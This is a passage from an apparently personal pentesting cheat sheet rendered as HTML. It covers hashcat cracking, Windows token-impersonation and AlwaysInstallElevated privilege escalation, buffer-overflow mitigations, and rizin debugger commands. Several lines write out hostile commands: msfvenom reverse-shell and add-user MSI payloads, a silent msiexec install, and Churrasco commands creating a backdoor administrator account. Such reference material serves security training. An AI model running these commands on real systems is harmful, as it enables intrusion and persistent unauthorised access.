href="https://github.com/stealthsploit/Optimised-hashcat-Rule">Optimized OneRuleToRuleThemAll</a> <ul> <li>Check the README for more rules</li> </ul> </li> <li><a href="http://contest-2010.korelogic.com/rules-hashcat.html">KoreLogic rules</a></li> <li><a href="https://github.com/nyxgeek/nyxgeek-rules/tree/master/hashcat-rules">Simple rules</a></li> </ul> <h4 id="hashes--bruteforce--hashcat--usage"> <a href="#hashes--bruteforce--hashcat--usage" class="anchor-heading" aria-labelledby="hashes--bruteforce--hashcat--usage"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Usage </h4> <ul> <li>Manually extract the hashes (from <code>shadow</code>, etc) and place it into a file</li> <li>Identify the hash type: <ul> <li><code>hashid -m &lt;hash&gt;</code> (<code>-e</code> ask for more)</li> <li>Run <code>john</code> to see if it automatically recognizes the hash</li> </ul> </li> <li>Find the <code>hashcat</code> numeric ID for the hash type if not auto-recognized:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-h</span> | <span class="nb">grep</span> <span class="nt">-i</span> <span class="nt">--color</span><span class="o">=</span>always &lt;<span class="nb">type</span><span class="o">&gt;</span> | less <span class="nt">-R</span></code></pre></div></div></li> <li>List all back-ends to use with <code>-D</code> / <code>-d</code><div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>optirun <span class="nt">--no-xorg</span> <span class="nt">-b</span> none <span class="nt">--</span> pvkrun hashcat <span class="nt">-I</span></code></pre></div></div></li> <li><code>WARNING:</code> The <code>-O</code> flag used for optimized kernels may not find the password if the salt contains emojis/non-ASCII characters</li> <li>CUDA + OpenCL CPU<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Use -a 1 with multiple dicts</span>
<span class="c"># Use -r &lt;rule&gt; to apply rules</span>
<span class="c"># Other attacks in hashcat -h end</span>
<span class="nv">vblank_mode</span><span class="o">=</span>0 <span class="nb">nice</span> <span class="nt">-10</span> optirun <span class="nt">--no-xorg</span> <span class="nt">-b</span> none <span class="nt">--</span> pvkrun hashcat <span class="nt">-D1</span>,2 <span class="nt">-d1</span>,4 <span class="nt">-a</span> 0 <span class="nt">-m</span> &lt;hash-id&gt; <span class="nt">-O</span> <span class="nt">-w</span> 4 &lt;hash-file&gt; &lt;wordlist&gt;
<span class="c"># -D 1 -&gt; CPU  | -D 2 -&gt; GPU</span>
<span class="c"># -d 1 -&gt; CUDA | -d 4 -&gt; OpenCL CPU</span>
<span class="c"># See above for issues with -O flag</span></code></pre></div></div></li> <li>CUDA + OpenCL GPU<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Use -a 1 with multiple dicts</span>
<span class="c"># Use -r &lt;rule&gt; to apply rules</span>
<span class="c"># Other attacks in hashcat -h end</span>
<span class="nv">vblank_mode</span><span class="o">=</span>0 <span class="nb">nice</span> <span class="nt">-10</span> optirun <span class="nt">--no-xorg</span> <span class="nt">-b</span> none <span class="nt">--</span> pvkrun hashcat <span class="nt">-D2</span> <span class="nt">-d1</span>,2 <span class="nt">--force</span> <span class="nt">-a</span> 0 <span class="nt">-m</span> &lt;hash-id&gt; <span class="nt">-O</span> <span class="nt">-w</span> 4 &lt;hash-file&gt; &lt;wordlist&gt;
<span class="c"># -D 2 -&gt; GPU</span>
<span class="c"># -d 1 -&gt; CUDA | -d 2 -&gt; OpenCL GPU</span>
<span class="c"># To use the unstable OpenCL GPU</span>
<span class="c"># it is required to use --force</span>
<span class="c"># See above for issues with -O flag</span></code></pre></div></div></li> <li>TODO - Use masks (best performance)</li> <li>TODO - Create dictionary via rule/mask</li> </ul> <h3 id="hashes--bruteforce--decode"> <a href="#hashes--bruteforce--decode" class="anchor-heading" aria-labelledby="hashes--bruteforce--decode"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Decode </h3> <h4 id="hashes--bruteforce--decode--references"> <a href="#hashes--bruteforce--decode--references" class="anchor-heading" aria-labelledby="hashes--bruteforce--decode--references"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> References </h4> <ul> <li>Many Windows tools from <a href="https://aluigi.altervista.org/pwdrec.htm">aluigi</a></li> </ul> <h4 id="hashes--bruteforce--decode--vnc"> <a href="#hashes--bruteforce--decode--vnc" class="anchor-heading" aria-labelledby="hashes--bruteforce--decode--vnc"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> VNC </h4> <ul> <li>Using <a href="https://aluigi.altervista.org/pwdrec/vncpwd.zip">Aluigi vncpwd</a> (may work on Linux):<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">vncpwd</span> <span class="o">&lt;</span><span class="kd">hash</span><span class="na">-or-file</span><span class="o">&gt;</span></code></pre></div></div></li> </ul> <h1 id="permissions"> <a href="#permissions" class="anchor-heading" aria-labelledby="permissions"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Permissions </h1> <h2 id="permissions--impersonation"> <a href="#permissions--impersonation" class="anchor-heading" aria-labelledby="permissions--impersonation"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Impersonation </h2> <h3 id="permissions--impersonation--windows"> <a href="#permissions--impersonation--windows" class="anchor-heading" aria-labelledby="permissions--impersonation--windows"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Windows </h3> <h4 id="permissions--impersonation--windows--check-privileges"> <a href="#permissions--impersonation--windows--check-privileges" class="anchor-heading" aria-labelledby="permissions--impersonation--windows--check-privileges"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Check Privileges </h4> <ul> <li>Check if the current user has impersonation permissions:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span> <span class="na">/priv
</span><span class="c">:: Check the SeImpersonatePrivilege</span>
<span class="c">:: or SeAssignPrimaryTokenPrivilege</span></code></pre></div></div></li> <li>Service accounts usually have this ability</li> </ul> <h4 id="permissions--impersonation--windows--juicy-potato"> <a href="#permissions--impersonation--windows--juicy-potato" class="anchor-heading" aria-labelledby="permissions--impersonation--windows--juicy-potato"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Juicy Potato </h4> <ul> <li>Impersonating with <a href="https://github.com/ohpe/juicy-potato">Juicy Potato</a>:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: msfvenom &lt;rev-shell&gt;.exe</span>
<span class="kd">JuicyPotato</span> <span class="na">-l </span><span class="o">&lt;</span><span class="kd">non</span><span class="na">-used-port</span><span class="o">&gt;</span> <span class="na">-t </span><span class="o">*</span> <span class="na">-p </span><span class="o">&lt;</span><span class="kd">rev</span><span class="na">-shell</span><span class="o">&gt;</span>.exe</code></pre></div></div></li> </ul> <h4 id="permissions--impersonation--windows--chimichurri---iis-7-7-5"> <a href="#permissions--impersonation--windows--chimichurri---iis-7-7-5" class="anchor-heading" aria-labelledby="permissions--impersonation--windows--chimichurri---iis-7-7-5"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Chimichurri - IIS 7/7.5 </h4> <ul> <li>Use <a href="https://github.com/Re4son/Chimichurri/">Chimichurri</a> (future: <a href="https://itm4n.github.io/chimichurri-reloaded/">new version</a>):<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: Spawn a reverse shell on IP:PORT</span>
<span class="kd">Chimichurri</span> <span class="o">&lt;</span><span class="kd">lhost</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="kd">lport</span><span class="o">&gt;</span></code></pre></div></div></li> </ul> <h4 id="permissions--impersonation--windows--churraskito---iis-6"> <a href="#permissions--impersonation--windows--churraskito---iis-6" class="anchor-heading" aria-labelledby="permissions--impersonation--windows--churraskito---iis-6"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Churraskito - IIS 6 </h4> <ul> <li>Use <a href="https://github.com/Re4son/Churraskito">Churraskito</a> (<code>stdafx.h</code> included):<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: Spawn a reverse shell on IP:PORT</span>
<span class="kd">churraskito</span> <span class="o">&lt;</span><span class="kd">lhost</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="kd">lport</span><span class="o">&gt;</span></code></pre></div></div></li> </ul> <h4 id="permissions--impersonation--windows--churrasco---windows-server-2003---iis-6"> <a href="#permissions--impersonation--windows--churrasco---windows-server-2003---iis-6" class="anchor-heading" aria-labelledby="permissions--impersonation--windows--churrasco---windows-server-2003---iis-6"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Churrasco - Windows Server 2003 - IIS 6 </h4> <ul> <li>Execute commands with <a href="https://github.com/Re4son/Churrasco">Churrasco</a>:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: Usage: churrasco -d "&lt;cmd&gt;"</span>
<span class="kd">churrasco</span> <span class="na">-d </span><span class="s2">"cmd.exe"</span>
<span class="c">:: Running cmd.exe is not immediate</span>
<span class="c">:: + may overlap with non-SYSTEM cmd</span>

<span class="c">:: Add backdoor user</span>
<span class="kd">churrasco</span> <span class="na">-d </span><span class="s2">"net user backup backup"</span>
<span class="kd">churrasco</span> <span class="na">-d </span><span class="s2">"net localgroup administrators backup /add"</span></code></pre></div></div></li> </ul> <h2 id="permissions--installation"> <a href="#permissions--installation" class="anchor-heading" aria-labelledby="permissions--installation"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Installation </h2> <h3 id="permissions--installation--windows---msi"> <a href="#permissions--installation--windows---msi" class="anchor-heading" aria-labelledby="permissions--installation--windows---msi"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Windows - MSI </h3> <ul> <li>Check whether the current user can install MSI with elevated privileges:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKCU</span>\SOFTWARE\Policies\Microsoft\Windows\Installer <span class="na">/v </span><span class="kd">AlwaysInstallElevated</span>

<span class="c">:: Or the machine in general</span>
<span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKLM</span>\SOFTWARE\Policies\Microsoft\Windows\Installer <span class="na">/v </span><span class="kd">AlwaysInstallElevated</span></code></pre></div></div></li> <li>Create an evil MSI:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Shell</span>
msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;local-ip&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;listening-port&gt; <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-f</span> msi <span class="nt">-o</span> shell.msi

<span class="c"># New user</span>
msfvenom <span class="nt">-p</span> windows/adduser <span class="nv">USER</span><span class="o">=</span>backup <span class="nv">PASS</span><span class="o">=</span>backup <span class="nt">-f</span> msi <span class="nt">-o</span> user.msi</code></pre></div></div></li> <li>Execute it:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">msiexec</span> <span class="na">/quiet /qn /i </span><span class="o">&lt;</span><span class="kd">file</span><span class="na">-path</span><span class="o">&gt;</span>.msi</code></pre></div></div></li> </ul> <h1 id="buffer-overflow"> <a href="#buffer-overflow" class="anchor-heading" aria-labelledby="buffer-overflow"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Buffer Overflow </h1> <h2 id="buffer-overflow--security-features-meaning"> <a href="#buffer-overflow--security-features-meaning" class="anchor-heading" aria-labelledby="buffer-overflow--security-features-meaning"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Security Features Meaning </h2> <h3 id="buffer-overflow--security-features-meaning--aslr"> <a href="#buffer-overflow--security-features-meaning--aslr" class="anchor-heading" aria-labelledby="buffer-overflow--security-features-meaning--aslr"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> ASLR </h3> <ul> <li>Base address randomization of loaded applications and libraries</li> <li>Check:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /proc/sys/kernel/randomize_va_space
<span class="c"># 0 -&gt; Disabled</span>

ldd &lt;file&gt;  <span class="c"># Run it multiple times</span>
<span class="c"># Libs in different address each time</span></code></pre></div></div></li> <li>Prevents <code>return to libc</code></li> <li>Bypass with <code>bruteforce-return to libc</code> or <code>return to plt</code> if PIE is disabled and <code>system</code> (or any other privesc function) is used by the binary</li> </ul> <h3 id="buffer-overflow--security-features-meaning--pie---pic"> <a href="#buffer-overflow--security-features-meaning--pie---pic" class="anchor-heading" aria-labelledby="buffer-overflow--security-features-meaning--pie---pic"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PIE / PIC </h3> <ul> <li>Position Independent Executable / Code</li> <li>Does the same than ASLR but for the binaries address space when executed</li> <li>Check with <code>checksec</code></li> <li>Prevents <code>return to plt</code></li> </ul> <h3 id="buffer-overflow--security-features-meaning--canaries"> <a href="#buffer-overflow--security-features-meaning--canaries" class="anchor-heading" aria-labelledby="buffer-overflow--security-features-meaning--canaries"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Canaries </h3> <ul> <li>Bytes that, when overridden, terminate the program</li> <li>Check with <code>checksec</code></li> <li>Bypass by leaking their address</li> </ul> <h3 id="buffer-overflow--security-features-meaning--dep---nx"> <a href="#buffer-overflow--security-features-meaning--dep---nx" class="anchor-heading" aria-labelledby="buffer-overflow--security-features-meaning--dep---nx"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> DEP / NX </h3> <ul> <li>Data Execution Prevention / No eXecute</li> <li>Prevent executing data (shellcode) from the memory (stack, heap, etc)</li> <li>Check with <code>checksec</code></li> <li>Bypass with <code>return to libc</code></li> </ul> <h3 id="buffer-overflow--security-features-meaning--relro"> <a href="#buffer-overflow--security-features-meaning--relro" class="anchor-heading" aria-labelledby="buffer-overflow--security-features-meaning--relro"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> RELRO </h3> <ul> <li>RELocation Read Only</li> <li>Makes the relocation sections used to resolve dynamically loaded functions (GOT) read-only by resolving them at beginning of execution</li> <li>Full RELRO prevents <code>GOT override</code></li> </ul> <h2 id="buffer-overflow--checksec"> <a href="#buffer-overflow--checksec" class="anchor-heading" aria-labelledby="buffer-overflow--checksec"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Checksec </h2> <ul> <li><a href="https://github.com/slimm609/checksec.sh">Site</a> - check the properties of binaries:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>checksec <span class="nt">--file</span><span class="o">=</span>&lt;file&gt;
<span class="c"># Multiple files:    --listfile=&lt;list&gt;</span>
<span class="c"># Running process:   --proc=&lt;name&gt;</span>
<span class="c"># Running proc libs: --proc-libs=&lt;pid&gt;</span>
<span class="c"># All running procs: --proc-all</span></code></pre></div></div></li> </ul> <h2 id="buffer-overflow--identify-badchars"> <a href="#buffer-overflow--identify-badchars" class="anchor-heading" aria-labelledby="buffer-overflow--identify-badchars"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Identify Badchars </h2> <h3 id="buffer-overflow--identify-badchars--shell---bash-zsh"> <a href="#buffer-overflow--identify-badchars--shell---bash-zsh" class="anchor-heading" aria-labelledby="buffer-overflow--identify-badchars--shell---bash-zsh"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Shell - Bash/Zsh </h3> <ul> <li>Chars generation:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># All: 0102030405060708090a...</span>
<span class="nb">seq </span>255 | xargs <span class="nb">printf</span> <span class="s1">'%02x'</span>

<span class="c"># All but 01|0a: 0203040506070809...</span>
<span class="nb">seq </span>255 | <span class="nb">awk</span> <span class="nt">-v</span> <span class="nv">ORS</span><span class="o">=</span> <span class="s1">'($0=sprintf("%02x",$0))!~/01|0a/'</span>

<span class="c"># Feed all hex as input in bash/zsh</span>
<span class="nb">printf</span> <span class="si">$(</span><span class="nb">seq </span>255 | xargs <span class="nb">printf</span> <span class="s1">'\\x%02x'</span><span class="si">)</span>

<span class="c"># Feed some hex as input in bash/zsh</span>
<span class="nb">printf</span> <span class="si">$(</span><span class="nb">seq </span>255 | <span class="nb">awk</span> <span class="nt">-v</span> <span class="nv">ORS</span><span class="o">=</span> <span class="s1">'($0=sprintf("\\x%02x",$0))!~/01|0a/'</span><span class="si">)</span></code></pre></div></div></li> </ul> <h3 id="buffer-overflow--identify-badchars--exploit-bad-characters"> <a href="#buffer-overflow--identify-badchars--exploit-bad-characters" class="anchor-heading" aria-labelledby="buffer-overflow--identify-badchars--exploit-bad-characters"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> exploit-bad-characters </h3> <ul> <li><a href="https://github.com/silverark/exploit-bad-characters">Site</a> - Python library to generate and filter bad chars</li> </ul> <h3 id="buffer-overflow--identify-badchars--expdevbadchars"> <a href="#buffer-overflow--identify-badchars--expdevbadchars" class="anchor-heading" aria-labelledby="buffer-overflow--identify-badchars--expdevbadchars"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> expdevBadChars </h3> <ul> <li><a href="https://github.com/mgeeky/expdevBadChars">Site</a> - good/bad buffer char comparer <ul> <li>Use <code>px 255 @r:SP</code> as &#8220;bad buffer&#8221;</li> </ul> </li> </ul> <h3 id="buffer-overflow--identify-badchars--rizin"> <a href="#buffer-overflow--identify-badchars--rizin" class="anchor-heading" aria-labelledby="buffer-overflow--identify-badchars--rizin"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Rizin </h3> <ul> <li>Reopen binary with all bytes as input:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Quotes may be necessary around $()</span>
ood <span class="si">$(</span><span class="s2">"!printf </span><span class="si">$(</span><span class="nb">seq </span>255 | xargs <span class="nb">printf</span> <span class="s1">'\\\\x%02x'</span><span class="si">)</span><span class="s2">"</span><span class="si">)</span></code></pre></div></div></li> <li>Find bytes that made it to the stack:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Expected output: 01020304...ff</span>
px0 255 @r:SP
<span class="c"># Some bytes may be slightly changed</span>
<span class="c"># Use expdevBadChars to locate them</span></code></pre></div></div></li> </ul> <h2 id="buffer-overflow--rizin"> <a href="#buffer-overflow--rizin" class="anchor-heading" aria-labelledby="buffer-overflow--rizin"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Rizin </h2> <h3 id="buffer-overflow--rizin--resources"> <a href="#buffer-overflow--rizin--resources" class="anchor-heading" aria-labelledby="buffer-overflow--rizin--resources"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Resources </h3> <ul> <li><a href="https://github.com/rizinorg/rizin">Project</a> - <a href="https://book.rizin.re/">Docs</a> - <a href="https://rizin.re/">Official Page</a></li> </ul> <h3 id="buffer-overflow--rizin--troubleshoot"> <a href="#buffer-overflow--rizin--troubleshoot" class="anchor-heading" aria-labelledby="buffer-overflow--rizin--troubleshoot"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Troubleshoot </h3> <ul> <li>If the payload segfaults the binary it may be due to a misaligned stack: <ul> <li>Either use NOPs as padding (before and after the payload)</li> <li>Or add a <code>ret</code> after the offset to IP and before the shellcode - <a href="https://www.ret2rop.com/2018/08/return-to-plt-got-to-bypass-aslr-remote.html?showComment=1586731690087#c613236550826332244">Ref</a></li> </ul> </li> <li>If the BoF happens in a forked child and <code>e dbg.follow.child=true</code> or <code>dpc pid</code> don&#8217;t help, use the shell to attach:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Attach newest &lt;bin&gt; in debug mode</span>
<span class="c"># Continue proc + close fd afterwards</span>
o dbg://<span class="si">$(</span><span class="o">!</span>pgrep <span class="nt">-n</span> &lt;bin&gt;<span class="si">)</span><span class="p">;</span> dc<span class="p">;</span> o-<span class="k">*</span>

<span class="c"># Or the same from the shell</span>
rizin <span class="nt">-c</span> <span class="s1">'dc; o-*'</span> <span class="nt">-d</span> <span class="si">$(</span>pgrep <span class="nt">-n</span> &lt;bin&gt;<span class="si">)</span></code></pre></div></div></li> </ul> <h3 id="buffer-overflow--rizin--most-useful-commands"> <a href="#buffer-overflow--rizin--most-useful-commands" class="anchor-heading" aria-labelledby="buffer-overflow--rizin--most-useful-commands"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Most useful commands </h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Analysis</span>
aa          <span class="c"># Almost-all analysis</span>
aaa         <span class="c"># Deepest analysis</span>
al          <span class="c"># Analyze func commands</span>
afva        <span class="c"># Function variable/args...</span>
afu &lt;addr&gt;  <span class="c"># Analyze func until addr</span>

<span class="c"># Files</span>
o <span class="o">[</span>&lt;file&gt;]   <span class="c"># List fds/open new file</span>
oi[-] <span class="o">[</span>file] <span class="c"># Ext fd info/close by idx</span>
oo[+]        <span class="c"># Reopen file [in rw]</span>
ood <span class="o">[</span>args]   <span class="c"># Reopen in debug + args</span>
oodf <span class="o">[</span>file]  <span class="c"># Reopen debug + file</span>
oodr <span class="o">[</span>rzrun] <span class="c"># Reopen debug + rz-run</span>
oC &lt;len&gt;     <span class="c"># New-fd memcpy len bytes</span>
o-&lt;fd&gt;       <span class="c"># Close file by fd</span>
o-<span class="k">*</span>          <span class="c"># Close all fds</span>
o-!          <span class="c"># Close all fds - selected</span>
ox &lt;f&gt; &lt;x&gt;   <span class="c"># Exchange fds f and x</span>
o &lt;file&gt; &lt;addr&gt; &lt;mode&gt;  <span class="c"># Map file</span>
on &lt;file&gt; &lt;addr&gt;  <span class="c"># Map file no rz_bin</span>
e cmd.open<span class="o">=</span>&lt;cmd&gt;  <span class="c"># Run cmd after open</span>

<span class="c"># File information</span>
iI    <span class="c"># Magic, compiler, security...</span>
ieee  <span class="c"># Entry and exitpoints</span>
is    <span class="c"># Symbols</span>
ii    <span class="c"># Imports</span>

<span class="c"># Strings in .data and the whole file</span>
iz ~&lt;grep-search&gt;
izz  <span class="c"># Append a `q' for less verbosity</span>

<span class="c"># Fast-search the output in HUD mode</span>
izz ~<span class="o">{</span>:... <span class="c"># {: -&gt; Pretty format</span>
<span class="c"># {: format is recommended for HUD as</span>
<span class="c"># it seems to ignore unaligned text</span>

<span class="c"># HUD mode</span>
&lt;arrows&gt;  <span class="c"># Select a result</span>
&lt;Enter&gt;   <span class="c"># Seek to address</span>

<span class="c"># Grep rows and cols numbers</span>
izz ~:&lt;row-ini&gt;..&lt;row-end&gt;[&lt;col&gt;]
izz ~&lt;search-term&gt;[&lt;col-ini&gt;-&lt;col-end&gt;]
izz ~:4[&lt;col1&gt;,&lt;col5&gt;]
izz ~+..&lt;search&gt; <span class="c"># i-case + less pager</span>

<span class="c"># Seek to..</span>
s <span class="sb">`</span>ieq<span class="sb">`</span>     <span class="c"># Entrypoint (alt: entry0)</span>
sa &lt;align&gt;  <span class="c"># Alignment</span>
sf.         <span class="c"># Beginning of current func</span>
sf <span class="o">[</span>&lt;func&gt;] <span class="c"># Next/specific function</span>
sr &lt;reg&gt;    <span class="c"># Register</span>
shu         <span class="c"># Previous seek (undo)</span>
shr         <span class="c"># Next seek (redo)</span>

<span class="c"># Show current seek position 0 padded</span>
spad

<span class="c"># Debug files/processes/threads...</span>
o dbg://&lt;f&gt; <span class="c"># Debug file/pid in new-fd</span>
<span class="nb">dd</span> <span class="o">[</span>&lt;file&gt;] <span class="c"># Show/open file (?)</span>
doo <span class="o">[</span>args]  <span class="c"># Reopen file in debug mode</span>
doof <span class="o">[</span>file] <span class="c"># Reopen file in debug mode</span>
dor <span class="o">[</span>rzrun] <span class="c"># Set rz-run opts ',' sep</span>
doc         <span class="c"># Close debug session</span>
dd-&lt;fd&gt;     <span class="c"># Close file descriptor</span>
dp <span class="o">[</span>&lt;pid&gt;]  <span class="c"># Show pid+children of pid</span>
dpl         <span class="c"># Show all attachable pids</span>
dpa &lt;pid&gt;   <span class="c"># Attach (and select) pid</span>
<span class="nv">dp</span><span class="o">=</span>&lt;pid&gt;    <span class="c"># Select pid</span>
dpc[<span class="k">*</span><span class="o">]</span>      <span class="c"># Select/Display forked pid</span>
dpn         <span class="c"># Fork in a new process</span>
dpk &lt;p&gt; <span class="o">[</span>&lt;s&gt;] <span class="c"># Send signal &lt;s&gt; to &lt;p&gt;</span>
dpt <span class="o">[</span>&lt;pid&gt;] <span class="c"># Show threads of pid</span>
<span class="nv">dpt</span><span class="o">=</span>&lt;thrd&gt;  <span class="c"># Attach to thread</span>
dptn        <span class="c"># Clone in a new thread</span>
e cmd.load<span class="o">=</span>&lt;cmd&gt;  <span class="c"># Run cmd after load</span>

<span class="c"># Debug step/continue...</span>
dsp         <span class="c"># Step until program starts</span>
ds <span class="o">[</span>&lt;num&gt;]  <span class="c"># Step one/num instructions</span>
dso <span class="o">[</span>&lt;num&gt;] <span class="c"># Step over one/num instr</span>
dss &lt;num&gt;   <span class="c"># Skip num instructions</span>
dsu &lt;addr&gt;  <span class="c"># Step until address</span>
dsi &lt;cond&gt;  <span class="c"># Step until condition</span>
dsl <span class="o">[</span>&lt;num&gt;] <span class="c"># Step one/num code lines</span>
dsb         <span class="c"># Step back (tracing req)</span>
dc <span class="o">[</span>&lt;pid&gt;]  <span class="c"># Continue all/one pids</span>
dcb         <span class="c"># Continue back (tracing)</span>
dcu &lt;multi&gt; <span class="c"># Continue until addr/range</span>
dcr         <span class="c"># Continue until return</span>
dcc         <span class="c"># Continue until call</span>

<span class="c"># Breakpoints...</span>
db &lt;addr&gt;    <span class="c"># Create one in address</span>
dbH &lt;addr&gt;   <span class="c"># Create a hardware one</span>
dbc &lt;addr&gt; &lt;cmd&gt; <span class="c"># Run command at brkp</span>
dbn <span class="o">[</span>&lt;name&gt;] <span class="c"># Show/name current breakp</span>
db           <span class="c"># Show defined</span>
dbs &lt;addr&gt;   <span class="c"># Toggle breakpoint</span>
db-&lt;addr&gt;    <span class="c"># Remove breakpoint</span>
drx-&lt;num&gt;    <span class="c"># Remove hardware breakp</span>
dbts &lt;addr&gt;  <span class="c"># Toggle tracing</span>
dbt          <span class="c"># Show backtraces</span>
dt <span class="o">[</span>&lt;addr&gt;]  <span class="c"># Show traces</span>
dts+/-       <span class="c"># Start/Stop trace session</span>
dtg          <span class="c"># Show trace graph</span>
dtgi         <span class="c"># Interactive trace</span>
dtsm         <span class="c"># List trace memory-map</span>
e cmd.bp<span class="o">=</span>&lt;cmd&gt;  <span class="c"># Run cmd on bp hit</span>
e cmd.hitinfo<span class="o">=</span>0 <span class="c"># Hide bp info when hit</span>

<span class="c"># Registers...</span>
<span class="nv">dr</span><span class="o">=</span>            <span class="c"># Show in columns</span>
dr &lt;reg&gt;<span class="o">=</span>&lt;val&gt; <span class="c"># Set value</span>
dr?&lt;reg&gt;       <span class="c"># Show value: ? optional</span>
dr??           <span class="c"># Show values + roles</span>
drd            <span class="c"># Show modified only</span>
dro            <span class="c"># Show previous values</span>
drr            <span class="c"># Show refs: telescoping</span>

<span class="c"># Objects...</span>
pf S @obj.&lt;name&gt;   <span class="c"># Show stored string</span>
pf p @obj.&lt;name&gt;+8 <span class="c"># Show length 64bit</span>

<span class="c"># Disassemble... all accept &lt;num&gt; instr</span>
pds        <span class="c"># Call summary</span>
pC         <span class="c"># Print in columns</span>
pdf        <span class="c"># Print function</span>
pdr        <span class="c"># Show recursive call graph</span>

<span class="c"># 10 bytes before + 10 after: Noted-hex</span>
pxc 20 @ <span class="nv">$$</span> - 10

<span class="c"># 20 bytes with text convertion in ESP</span>
pxz 20 @ esp

<span class="c"># Detailed hex + jump references notes</span>
pxr

<span class="c"># Locate usage of addresses (use aa)</span>
axt <span class="o">[</span>&lt;addr&gt;]  <span class="c"># Refs to this address</span>
axf <span class="o">[</span>&lt;addr&gt;]  <span class="c"># Refs from this address</span>
ax. <span class="o">[</span>&lt;addr&gt;]  <span class="c"># Refs from/to this addr</span>
axff <span class="o">[</span>&lt;addr&gt;] <span class="c"># Refs from this funct</span>
ax ~...       <span class="c"># All references HUD mode</span>
axg <span class="o">[</span>&lt;addr&gt;]  <span class="c"># Current func call-graph</span>
afl           <span class="c"># List analyzed functions</span>
afi           <span class="c"># Verbose afl</span>
afM &lt;func&gt;    <span class="c"># Show function map</span>
afo           <span class="c"># Show function address</span>
afx           <span class="c"># Show functions refs</span>
afvx          <span class="c"># Show funcs vars refs</span>
afvxv         <span class="c"># Funcs local vars refs</span>
afv           <span class="c"># Show function variables</span>
afvd          <span class="c"># Funcs vars/args value</span>
afvr          <span class="c"># Reg-based args/locals</span>
afvs          <span class="c"># Stack-based args/locals</span>
afvb          <span class="c"># Base-pointer arg/locals</span>
